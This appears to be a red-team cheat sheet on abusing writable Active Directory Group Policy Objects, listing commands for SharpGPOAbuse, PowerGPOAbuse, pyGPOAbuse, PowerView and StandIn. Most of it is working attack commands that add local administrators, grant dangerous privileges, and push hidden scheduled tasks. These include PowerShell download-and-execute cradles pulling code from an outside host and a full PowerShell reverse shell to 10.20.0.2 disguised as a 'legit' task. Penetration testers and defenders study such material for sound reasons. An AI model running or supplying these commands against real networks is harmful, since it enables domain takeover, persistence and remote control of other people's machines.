# Active Directory - Group Policy Objects

> Creators of a GPO are automatically granted explicit Edit settings, delete, modify security, which manifests as CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner

:triangular_flag_on_post: GPO Priorization : Organization Unit > Domain > Site > Local

GPO are stored in the DC in `\\<domain.dns>\SYSVOL\<domain.dns>\Policies\<GPOName>\`, inside two folders **User** and **Machine**.
If you have the right to edit the GPO you can connect to the DC and replace the files. Planned Tasks are located at `Machine\Preferences\ScheduledTasks`.

:warning: Domain members refresh group policy settings every 90 minutes with a random offset of 0 to 30 minutes but it can locally be forced with the following command: `gpupdate /force`.

## Find vulnerable GPO

Look a GPLink where you have the **Write** right.

```powershell
Get-DomainObjectAcl -Identity "SuperSecureGPO" -ResolveGUIDs |  Where-Object {($_.ActiveDirectoryRights.ToString() -match "GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner")}
```

* [cogiceo/GPOHound](https://github.com/cogiceo/GPOHound) - Offensive GPO dumping and analysis tool that leverages and enriches BloodHound data.

```ps1
pipx install "git+https://github.com/cogiceo/GPOHound"
gpohound dump --json
gpohound dump --list --gpo-name
gpohound dump --guid 21246D99-1426-495B-9E8E-556ABDD81F94
gpohound dump --file scripts psscripts
gpohound dump --search 'VNC.*Server' --show
gpohound analysis --json
gpohound analysis --processed --object group registry
gpohound analysis --guid CCF6CAE3-E280-4109-8F9D-25461DBB5D67 --affected
gpohound analysis --computer 'SRV-PA-03.NORTH.SEVENKINGDOMS.LOCAL' --order
gpohound analysis --enrich
```

## Abuse GPO with SharpGPOAbuse

* [FSecureLABS/SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) - SharpGPOAbuse is a .NET application written in C# that can be used to take advantage of a user's edit rights on a Group Policy Object (GPO) in order to compromise the objects that are controlled by that GPO.

```powershell
# Build and configure SharpGPOAbuse
Install-Package CommandLineParser -Version 1.9.3.15
ILMerge.exe /out:C:\SharpGPOAbuse.exe C:\Release\SharpGPOAbuse.exe C:\Release\CommandLine.dll

# Adding User Rights
.\SharpGPOAbuse.exe --AddUserRights --UserRights "SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight" --UserAccount bob.smith --GPOName "Vulnerable GPO"

# Adding a Local Admin
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName "Vulnerable GPO"

# Configuring a User or Computer Logon Script
.\SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"

# Configuring a Computer or User Immediate Task
# /!\ Intended to "run once" per GPO refresh, not run once per system
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"
.\SharpGPOAbuse.exe --AddComputerTask --GPOName "VULNERABLE_GPO" --Author 'LAB.LOCAL\User' --TaskName "EvilTask" --Arguments  "/c powershell.exe -nop -w hidden -enc BASE64_ENCODED_COMMAND " --Command "cmd.exe" --Force
```

## Abuse GPO with PowerGPOAbuse

* [rootSySdk/PowerGPOAbuse](https://github.com/rootSySdk/PowerGPOAbuse) - Powershell version of SharpGPOAbuse.

```ps1
PS> . .\PowerGPOAbuse.ps1

# Adding a localadmin 
PS> Add-LocalAdmin -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'

# Assign a new right 
PS> Add-UserRights -Rights "SeLoadDriverPrivilege","SeDebugPrivilege" -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'

# Adding a New Computer/User script 
PS> Add-ComputerScript/Add-UserScript -ScriptName 'EvilScript' -ScriptContent $(Get-Content evil.ps1) -GPOIdentity 'SuperSecureGPO'

# Create an immediate task 
PS> Add-GPOImmediateTask -TaskName 'eviltask' -Command 'powershell.exe /c' -CommandArguments "'$(Get-Content evil.ps1)'" -Author Administrator -Scope Computer/User -GPOIdentity 'SuperSecureGPO'
```

## Abuse GPO with pyGPOAbuse

* [Hackndo/pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse) - Partial python implementation of SharpGPOAbuse.

```powershell
# Add john user to local administrators group (Password: H4x00r123..)
./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012"

# Reverse shell example
./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012" \ 
    -powershell \ 
    -command "\$client = New-Object System.Net.Sockets.TCPClient('10.20.0.2',1234);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()" \ 
    -taskname "Completely Legit Task" \
    -description "Dis is legit, pliz no delete" \ 
    -user
```

## Abuse GPO with PowerView

```powershell
# Enumerate GPO
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}

# New-GPOImmediateTask to push an Empire stager out to machines via VulnGPO
New-GPOImmediateTask -TaskName Debugging -GPODisplayName VulnGPO -CommandArguments '-NoP -NonI -W Hidden -Enc AAAAAAA...' -Force
```

## Abuse GPO with

* [FuzzySecurity/StandIn](https://github.com/FuzzySecurity/StandIn) - StandIn is a small .NET35/45 AD post-exploitation toolkit.

```powershell
# Add a local administrator
StandIn.exe --gpo --filter Shards --localadmin user002

# Set custom right to a user
StandIn.exe --gpo --filter Shards --setuserrights user002 --grant "SeDebugPrivilege,SeLoadDriverPrivilege"

# Execute a custom command
StandIn.exe --gpo --filter Shards --tasktype computer --taskname Liber --author "REDHOOK\Administrator" --command "C:\I\do\the\thing.exe" --args "with args"
```

## References

* [A Red Teamer's Guide to GPOs and OUs - APRIL 2, 2018 - @_wald0](https://wald0.com/?p=179)
* [Abusing GPO Permissions - harmj0y - March 17, 2016](https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [Abusing sAMAccountName Hijacking in "GPP: Local Users and Groups" - @toffyrak - June 12, 2025](https://www.cogiceo.com/en/whitepaper_gpphijacking/)
* [GPO Abuse - Part 1 - RastaMouse - 6 January 2019](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
* [GPO Abuse - Part 2 - RastaMouse - 13 January 2019](https://rastamouse.me/2019/01/gpo-abuse-part-2/)
* [GPO Abuse: "You can't see me" - Huy Kha -  July 19, 2019](https://pentestmag.com/gpo-abuse-you-cant-see-me/)
* [Training - Attacking and Defending Active Directory Lab - Altered Security](https://www.alteredsecurity.com/adlab)
